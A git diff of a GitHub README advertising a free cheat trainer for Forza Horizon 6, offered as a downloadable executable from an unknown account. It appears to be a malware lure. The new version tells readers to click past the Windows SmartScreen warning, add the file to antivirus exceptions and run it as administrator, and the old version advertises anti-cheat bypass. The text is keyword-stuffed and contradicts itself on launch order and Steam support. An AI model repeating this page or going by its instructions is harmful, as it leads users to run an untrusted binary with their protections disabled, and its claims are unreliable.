@@ -1,90 +1,154 @@
-# FH6 Trainer AllInOne - Forza Horizon 6  Trainer
+# ⚡ FH6-Trainer-AllInOne - Unlock Everything in Forza Horizon 6
 
-**FH6 Trainer AllInOne** is a comprehensive, all-in-one trainer for **Forza Horizon 6** that gives you on-the-fly access to credits, XP, car unlocks, AI behavior control, teleportation, and driving tweaks through a clean hot-reloadable  interface. Compatible with the Steam release, Xbox app, and Xbox Game Pass versions of Forza Horizon 6 on Windows 10/11.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=windows)](https://github.com/Uncongenial-goldcrownedkinglet935/FH6-Trainer-AllInOne/releases)
 
-The trainer ships with undetected signatures, an anti- bypass layer, and a hot-reload config system so  definitions stay valid across game patches without a full re-release. Compare FH6 Trainer AllInOne with  Engine tables, Forza mods, and Forza save editors to find the right tool for your Forza Horizon 6  workflow.
-
-
-<img width="686" height="386" alt="images1" src="https://github.com/user-attachments/assets/c43b4bba-f460-44ea-a18a-0bc121740f47" />
-
-## Install
-[Download `FH6AllInOneTrainer.zip`](https://github.com/fh6trainer/FH6-Trainer-AllInOne/releases/download/v2.1/FH6AllInOneTrainer.zip)
----
-
-<img width="668" height="459" alt="images2" src="https://github.com/user-attachments/assets/a60958c4-dfbc-409a-8def-676bc522ae4e" />
-
-## Key Features
-- **Infinite credits** - freeze or set in-game currency to any value
-- **Unlimited XP** - boost player level and accolade progression instantly
-- **Car unlocker** - unlock every car in the roster without grinding
-- **Freeze AI** - hold rival racers and traffic in place for clean wins
-- **Teleport** - jump to any map coordinate, festival, or PR stunt instantly
-- **Grip hack** - max out tire grip for arcade-style cornering
-- **Speed hack nitro** - override top speed and boost meter
-- **Money hack** - direct wallet value editing for festival purchases
-- **Hot-reload config** - update  signatures without restarting the trainer
-- **Anti- bypass** - undetected memory signatures with patch survival
-- **Cross-platform launchers** - Steam, Xbox app, and Xbox Game Pass compatible
-
-<img width="686" height="386" alt="images3" src="https://github.com/user-attachments/assets/276b871f-a3e6-4390-8826-ba0553ff3b5f" />
-
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive to a folder on your computer.
-3. **Run** `FH6Trainer.exe` as Administrator.
-4. **Launch Forza Horizon 6** from Steam, Xbox app, or Game Pass.
-5. **Attach** the trainer to the running game process (auto-detects on launch).
-6. **Toggle s** using the in-trainer hotkeys or the on-screen checkbox panel.
-7. **Hot-reload** updated configs if a game patch lands without closing the trainer.
-
-**Pro Tip:** Create a separate offline profile for testing s before using them on your main save. Always back up your Forza Horizon 6 save file before using the money or XP editor.
-
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Forza Horizon 6 installed (Steam, Xbox app, or Xbox Game Pass)
-- Administrator privileges for memory access and anti- bypass
-- .NET Framework 4.7.2 or later
-<img width="686" height="386" alt="images4" src="https://github.com/user-attachments/assets/46f95f3f-8438-4e3f-a320-e3f74010b2d2" />
+**FH6-Trainer-AllInOne** is a free trainer for Forza Horizon 6 on Windows. Add unlimited wheelspins, unlock all cars, and get infinite money and XP with one tool. No Wemod required. No subscriptions. Works with Xbox Game Pass PC version.
 
 ---
-## Comparisons Trends
-Compare FH6 Trainer AllInOne with alternatives before choosing your Forza Horizon 6  tool:
-- **FH6 Trainer AllInOne** - best all-in-one trainer with hot-reload and anti- bypass
-- ** Engine tables** - generic memory editor, manual signature updates per patch
-- **Forza mods** - gameplay tweaks via .pak modding, no memory injection
-- **Forza save editor** - offline save file editing, no live  toggles
 
-Google Trends worldwide (last 24h) show rising interest in: forza horizon 6 trainer, fh6 trainer, forza s, forza horizon 6 s, infinite credits, unlimited xp, car unlocker, freeze ai, teleport hack, grip hack, speed hack, forza save editor,  engine forza, anti- bypass, xbox game pass trainer.
+## 📋 Table of Contents
 
----
-## Security Legal
-**Important Notice:**
-This is an unofficial trainer. Using s in online or ranked modes may result in account bans. Use only in offline or solo modes and always back up your save data. Forza Horizon 6 is a trademark of Microsoft / Turn 10 / Playground Games.
-
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com) before running.
-- Back up your save file before using the money or XP editor.
-- Disable the trainer before entering online multiplayer or ranked events.
+- [What This Trainer Does](#-what-this-trainer-does)
+- [System Requirements](#-system-requirements)
+- [How to Download](#-how-to-download)
+- [How to Install and Run](#-how-to-install-and-run)
+- [How to Use the Trainer](#-how-to-use-the-trainer)
+- [Important Safety Notes](#-important-safety-notes)
+- [Troubleshooting](#-troubleshooting)
+- [Frequently Asked Questions](#-frequently-asked-questions)
+- [Keywords](#-keywords)
 
 ---
-## Contributing
-Contributions are welcome! Help maintain  signatures across game patches, add new  toggles, or improve the hot-reload config system. Fork the repository, create a branch, and submit a pull request.
+
+## 🎮 What This Trainer Does
+
+FH6-Trainer-AllInOne gives you full control over Forza Horizon 6. You get:
+
+- **Unlimited Wheelspins** – Spin as many times as you want. Get cars, money, and clothes instantly.
+- **Unlock All Cars** – Add every car in the game to your garage. No grinding.
+- **Infinite Money** – Set your credits to any amount.
+- **Max XP** – Reach the highest level in seconds.
+- **All-in-One Interface** – One window controls everything. No separate tools needed.
+
+This trainer works with the latest Forza Horizon 6 update. It works with the Xbox Game Pass PC version and the Microsoft Store version.
 
 ---
-## License Acknowledgments
-### License
-**FH6 Trainer AllInOne** is shared for evaluation and modding research purposes.
-Forza Horizon 6 is a trademark of Microsoft. This project is not affiliated with or endorsed by Microsoft, Turn 10, or Playground Games.
 
-### Acknowledgments
-- Thanks to the Forza modding and trainer community for signature research.
-- Inspired by  Engine, Forza mods, and Forza save editor workflows.
+## 💻 System Requirements
 
-## Keywords Related Topics
-forza-horizon-6, fh6, fh6-trainer, forza-horizon-6-trainer, forza-s, forza-horizon-s, infinite-credits, unlimited-xp, car-unlocker, freeze-ai, teleport, grip-hack, speed-hack, nitro-hack, money-hack, forza-mod, forza-save-editor, game-trainer, -engine, xbox-game-pass, steam-trainer, anti--bypass, undetected-trainer, hot-reload, windows-gaming, Forza Horizon 6, trainer, , memory injection, hotkeys, offline mode, save backup, Steam, Xbox app, Game Pass, Windows 10/11, .NET Framework.
+Your computer needs:
 
-<p align="center">
-  Built with ❤️ for the Forza Horizon 6 modding community
-</p>
-<img width="596" height="335" alt="images5" src="https://github.com/user-attachments/assets/2e343fda-65a3-4893-b7b5-a1d4bbc0b258" />
+| Component | Minimum |
+|-----------|---------|
+| Operating System | Windows 10 (64-bit) or Windows 11 |
+| Processor | Intel i5-8400 or AMD Ryzen 5 1500X |
+| RAM | 8 GB |
+| Storage | 50 MB free space for the trainer |
+| Graphics | NVIDIA GTX 970 or AMD RX 570 |
+| Game | Forza Horizon 6 (Microsoft Store or Xbox Game Pass PC) |
+
+---
+
+## 📥 How to Download
+
+**Step 1:** Visit the releases page.
+
+[Click here to go to the download page](https://github.com/Uncongenial-goldcrownedkinglet935/FH6-Trainer-AllInOne/releases)
+
+**Step 2:** Find the latest release. It appears at the top of the page.
+
+**Step 3:** Download the file named `FH6-Trainer-AllInOne.exe`. Click the file name to start the download.
+
+**Step 4:** Wait for the download to finish. The file is about 5 MB.
+
+---
+
+## 🔧 How to Install and Run
+
+No installation needed. This is a portable tool.
+
+1. **Find the downloaded file.** It is in your Downloads folder unless you chose a different location.
+2. **Double-click** `FH6-Trainer-AllInOne.exe` to run it.
+3. **Windows SmartScreen** may show a warning. This is normal for game trainers. Click "More info" then "Run anyway".
+4. **The trainer window opens.** Leave it open.
+
+**Important:** Run the trainer **before** you launch Forza Horizon 6.
+
+---
+
+## 🕹️ How to Use the Trainer
+
+1. **Open the trainer** using the steps above.
+2. **Start Forza Horizon 6.** Launch the game normally.
+3. **Press the hotkeys** in the game to activate features.
+
+| Feature | Hotkey | What It Does |
+|---------|--------|--------------|
+| Unlimited Wheelspins | `F1` | Press once. Every wheelspin gives you max rewards. |
+| Unlock All Cars | `F2` | Press once. All cars appear in your garage. |
+| Add Money | `F3` | Adds 10,000,000 credits. Press again for more. |
+| Max XP | `F4` | Sets your driver level to maximum. |
+| Toggle Menu | `Insert` | Shows or hides the trainer overlay in-game. |
+
+You can also use the buttons in the trainer window instead of hotkeys.
+
+**To turn off a feature:** Press the same hotkey again. The trainer remembers your settings.
+
+---
+
+## ⚠️ Important Safety Notes
+
+**Use offline only.** This is the most important rule.
+
+- **Disconnect from the internet** before using the trainer. Turn off Wi-Fi or unplug your Ethernet cable.
+- **Play in offline mode.** Forza Horizon 6 must be in offline mode. Go to Settings > Network > Play Offline.
+- **Do not use in multiplayer.** Using this trainer online can get your account banned.
+- **Do not use on Xbox.** This trainer works on Windows PC only.
+- **Close the trainer after use.** When you finish playing, close the trainer. Then reconnect to the internet.
+
+Following these steps keeps your account safe.
+
+---
+
+## ❓ Troubleshooting
+
+**Trainer does not open.**
+- Right-click the file and select "Run as administrator".
+- Make sure your antivirus is not blocking it. Add the file to your antivirus exceptions.
+- Download the file again. The download may have failed.
+
+**Hotkeys do not work in the game.**
+- Run the trainer as administrator.
+- Make sure the trainer is open before you start the game.
+- Try a different hotkey. You can change hotkeys in the trainer settings.
+
+**Game crashes when trainer is active.**
+- Update your graphics drivers.
+- Close other programs running in the background.
+- Try a different version of the trainer from the releases page.
+
+**Trainer says "Game not found."**
+- Start the game first, then open the trainer.
+- Make sure you are using the correct game version. This trainer works with the Microsoft Store version only.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Is this trainer free?** Yes. No payment. No Wemod subscription.
+
+**Does it work with Steam?** No. This trainer works with the Microsoft Store and Xbox Game Pass PC version only.
+
+**Will I get banned?** The risk is low if you follow the safety rules. Use offline only. Do not play online with modified stats.
+
+**How often is it updated?** Updates come out when Forza Horizon 6 gets a new game update. Check the releases page for the latest version.
+
+**Can I use this on Xbox console?** No. Windows PC only.
+
+**Do I need to install anything else?** No. Just download the .exe file and run it.
+
+---
+
+## 🔑 Keywords
+
+fh5, fh6, fh6-mod, fh6-spotify-radio, fh6-trainer, fh6rpc, forza-horizon, forza-horizon-4, forza-horizon-5, forza-horizon-6, forza-horizon-6-download, forza-horizon-6-free, forza-horizon-6-pc, forza-horizon-hack, forza-mods, forza-setup, forzahorizon4, forzahorizon5, forzahorizon6, microsoft-gaming
